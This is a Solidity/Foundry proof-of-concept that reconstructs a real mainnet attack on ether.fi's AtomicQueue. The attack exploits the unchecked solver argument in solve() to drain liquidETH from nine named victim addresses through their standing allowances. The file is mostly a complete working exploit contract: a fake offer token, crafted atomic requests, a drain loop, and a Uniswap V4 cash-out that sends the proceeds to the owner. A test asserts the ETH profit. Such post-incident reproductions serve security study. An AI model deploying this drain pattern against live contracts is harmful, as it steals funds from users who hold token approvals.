// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// ether.fi AtomicQueue - missing access control on the caller-supplied `solver` in solve() - Ethereum.
// 14.4455 liquidETH drained from 9 real third-party victims, cashed out via Uniswap V4 to ~15.45 ETH.
//
// Attack tx      : 0x7cbe0b4349513fed6d03ba8bf9ed708e10e07a501d10b5f344a25ae10595599b (block 25952624)
// Attacker EOA   : 0xa5CC6e490Bce9185fA47b421f2EaC677A83B64Ea
// Exploit (on-chain): worker 0x679c53fF03c5c60aAC538a019cA9d69C5DFa663E (created in a deployer ctor)
// AtomicQueue    : 0xD45884B592E316eB816199615A95C182F75dea07 (verified; vulnerable)
// want drained   : 0xf0bb20865277aBd641a307eCe5Ee04E79073416C (ether.fi Liquid ETH / liquidETH, a BoringVault share)
// V4 PoolManager : 0x000000000004444c5dc75cB358380D2e3dE08A90 (liquidETH/native-ETH pools used to cash out)
//
// REAL VICTIM vs DEMO: this is demonstrated impact against REAL third-party victims, NOT a self-contained demo.
// The trace drains liquidETH from 9 distinct on-chain addresses, each abusing that address's genuine, pre-existing
// ERC-20 allowance to AtomicQueue (left over from prior legitimate queue use). This PoC forks real mainnet state
// and drains those same real allowances - no mocked victim. (SlowMist noted a private disclosure to ether.fi;
// whether funds were later returned is out of band - the on-chain tx did move real users' funds.)
//
// ROOT CAUSE (confirmed against verified source - AtomicQueue.solve, lines 190-247):
//   function solve(ERC20 offer, ERC20 want, address[] users, bytes runData, address solver) external nonReentrant
//   has NO access control on `solver`: no `solver == msg.sender` check, no signature, no registration/consent.
//   For each user it does offer.safeTransferFrom(user, solver, offerAmount), then calls solver.finishSolve(...),
//   then want.safeTransferFrom(solver, user, assetsToUser), where assetsToUser = atomicPrice * offerAmount / 1e18
//   comes entirely from the user's OWN AtomicRequest. So an attacker:
//     1. names any address holding a standing want-allowance to AtomicQueue as `solver` (the victim),
//     2. makes itself a "user" via updateAtomicRequest() with a self-minted worthless `offer`, offerAmount=1e18,
//        and atomicPrice = min(victim balance, victim allowance) so assetsToUser == the max pullable,
//     3. calls solve(offer, want, [attacker], "", victim): pays the victim 1e18 of the worthless offer and pulls
//        `atomicPrice` of want out of the victim via AtomicQueue's standing allowance.
//   finishSolve is invoked on the victim; the real victims are contracts whose finishSolve/fallback is a no-op
//   that returns successfully, so the callback does not impede the drain.
//
// This PoC reconstructs the bug end to end: the 9 liquidETH drains, then the attacker's real Uniswap V4 cash-out
// of the drained liquidETH to native ETH across the same three pools. (The on-chain tx also grabbed ~1.36 USDC
// from a Coinbase smart wallet - dust, omitted.) Asserts the realized, slippage-adjusted ~15.45 ETH.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IAtomicQueue {
    struct AtomicRequest {
        uint64 deadline;
        uint88 atomicPrice;
        uint96 offerAmount;
        bool inSolve;
    }

    function updateAtomicRequest(IERC20 offer, IERC20 want, AtomicRequest calldata userRequest) external;
    function solve(IERC20 offer, IERC20 want, address[] calldata users, bytes calldata runData, address solver)
        external;
}

// Uniswap V4 core (Currency is an address under the hood).
interface IPoolManager {
    struct PoolKey {
        address currency0;
        address currency1;
        uint24 fee;
        int24 tickSpacing;
        address hooks;
    }

    struct SwapParams {
        bool zeroForOne;
        int256 amountSpecified;
        uint160 sqrtPriceLimitX96;
    }

    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey calldata key, SwapParams calldata params, bytes calldata hookData) external returns (int256);
    function sync(address currency) external;
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
}

interface IAccountant {
    function getRateInQuoteSafe(address quote) external view returns (uint256);
}

// Worthless offer token the attacker mints to itself - the only thing the victims are "paid".
contract FakeOffer is IERC20 {
    string public constant name = "Fake";
    string public constant symbol = "FAKE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 supply) {
        balanceOf[msg.sender] = supply;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
        balanceOf[f] -= a;
        balanceOf[t] += a;
        return true;
    }
}

contract EtherFiAtomicQueueExploit {
    IAtomicQueue constant QUEUE = IAtomicQueue(0xD45884B592E316eB816199615A95C182F75dea07);
    IERC20 constant LIQUID_ETH = IERC20(0xf0bb20865277aBd641a307eCe5Ee04E79073416C);
    IPoolManager constant V4 = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    address constant NATIVE = address(0);
    uint160 constant MAX_SQRT = 1461446703485210103287273052203988822378723970341; // V4 MAX_SQRT_PRICE - 1

    FakeOffer public immutable offer;
    address public immutable owner;

    constructor() {
        owner = msg.sender;
        offer = new FakeOffer(1000e18);
        offer.approve(address(QUEUE), type(uint256).max);
    }

    // Drain each victim's standing liquidETH allowance via solve(solver=victim), then cash out to ETH on V4.
    function attack(address[] calldata victims) external {
        for (uint256 i; i < victims.length; ++i) {
            address victim = victims[i];
            uint256 pullable = _min(LIQUID_ETH.balanceOf(victim), LIQUID_ETH.allowance(victim, address(QUEUE)));
            if (pullable == 0) continue;

            // assetsToUser = atomicPrice * offerAmount / 1e18; offerAmount = 1e18 => assetsToUser == atomicPrice.
            IAtomicQueue.AtomicRequest memory req = IAtomicQueue.AtomicRequest({
                deadline: type(uint64).max,
                atomicPrice: uint88(pullable),
                offerAmount: 1e18,
                inSolve: false
            });
            QUEUE.updateAtomicRequest(IERC20(address(offer)), LIQUID_ETH, req);

            address[] memory users = new address[](1);
            users[0] = address(this); // this contract is the crafted "user" whose request gets fulfilled
            QUEUE.solve(IERC20(address(offer)), LIQUID_ETH, users, "", victim);
        }

        // Cash out the drained liquidETH to native ETH across the same three V4 pools the attacker used.
        uint256 bal = LIQUID_ETH.balanceOf(address(this));
        uint256 first = 2.3e18;
        if (bal < first) first = bal;
        _v4Sell(100, 1, first);
        uint256 rest = LIQUID_ETH.balanceOf(address(this));
        _v4Sell(4500, 90, rest / 2);
        _v4Sell(4050, 81, LIQUID_ETH.balanceOf(address(this)));

        payable(owner).transfer(address(this).balance);
    }

    function _v4Sell(uint24 fee, int24 tickSpacing, uint256 amountIn) internal {
        if (amountIn == 0) return;
        V4.unlock(abi.encode(fee, tickSpacing, amountIn));
    }

    // V4 lock callback: swap liquidETH -> ETH, settle the liquidETH we owe, take the ETH we are owed.
    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(V4), "not v4");
        (uint24 fee, int24 tickSpacing, uint256 amountIn) = abi.decode(data, (uint24, int24, uint256));

        IPoolManager.PoolKey memory key = IPoolManager.PoolKey({
            currency0: NATIVE, // ETH < liquidETH, so native is currency0
            currency1: address(LIQUID_ETH),
            fee: fee,
            tickSpacing: tickSpacing,
            hooks: address(0)
        });
        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
            zeroForOne: false, // liquidETH (currency1) -> ETH (currency0)
            amountSpecified: -int256(amountIn), // negative = exact input
            sqrtPriceLimitX96: MAX_SQRT
        });

        int256 delta = V4.swap(key, params, "");
        int128 amount0 = int128(delta >> 128); // ETH delta (positive = owed to us)
        int128 amount1 = int128(delta); // liquidETH delta (negative = we owe); may be < amountIn on a partial fill

        // Settle exactly the liquidETH the swap consumed (not amountIn - the swap can partial-fill at the limit).
        if (amount1 < 0) {
            V4.sync(address(LIQUID_ETH));
            LIQUID_ETH.transfer(address(V4), uint256(uint128(-amount1)));
            V4.settle();
        }
        // Take exactly the ETH owed to us.
        if (amount0 > 0) {
            V4.take(NATIVE, address(this), uint256(uint128(amount0)));
        }

        return "";
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    receive() external payable {}
}

contract EtherFiAtomicQueue_exp is Test {
    IERC20 constant LIQUID_ETH = IERC20(0xf0bb20865277aBd641a307eCe5Ee04E79073416C);
    IAccountant constant ACCOUNTANT = IAccountant(0x0d05D94a5F1E76C18fbeB7A13d17C8a314088198);
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // The 9 real liquidETH victims, in attack order (each had a standing allowance to AtomicQueue).
    function _victims() internal pure returns (address[] memory v) {
        v = new address[](9);
        v[0] = 0x69da29127BC31909c26080105B585345DDe847D4;
        v[1] = 0x1226C76300A2a611182c08614B260c88bd6DB3B1;
        v[2] = 0xeE8D39AB46C685889B3E4A31347deDB5739D553D;
        v[3] = 0x0EACbaA94AEcc4e51d299a99915F64EE96F3b468;
        v[4] = 0x13B90df23158808185B247aB61EDe61b75d49E23;
        v[5] = 0x0ec7E8C2DDdEC157589208D19feF4927607CCfD1;
        v[6] = 0x516E726f53576Ee00Db9B96291CDD0F7EB5F8Cc7;
        v[7] = 0x4D4Ef453CF782926825F5768499C7e02DaA3A9E7;
        v[8] = 0x2cFb075E8FC0D99837653629B0A3d527f0769a1A;
    }

    function testExploit() public {
        vm.createSelectFork("mainnet", 25952623); // parent block of the exploit tx

        EtherFiAtomicQueueExploit exploit = new EtherFiAtomicQueueExploit();

        uint256 ethBefore = address(this).balance;
        exploit.attack(_victims());
        uint256 ethProfit = address(this).balance - ethBefore;

        uint256 rate = ACCOUNTANT.getRateInQuoteSafe(WETH);
        emit log_named_decimal_uint("liquidETH NAV rate", rate, 18);
        emit log_named_decimal_uint("attacker ETH profit", ethProfit, 18);

        // Realized, slippage-adjusted gain after the V4 cash-out; on-chain figure 15.453645063405167626 ETH.
        assertApproxEqRel(ethProfit, 15.453645063405167626 ether, 0.03e18, "ETH profit off reported ~15.45 ETH");
    }

    receive() external payable {}
}
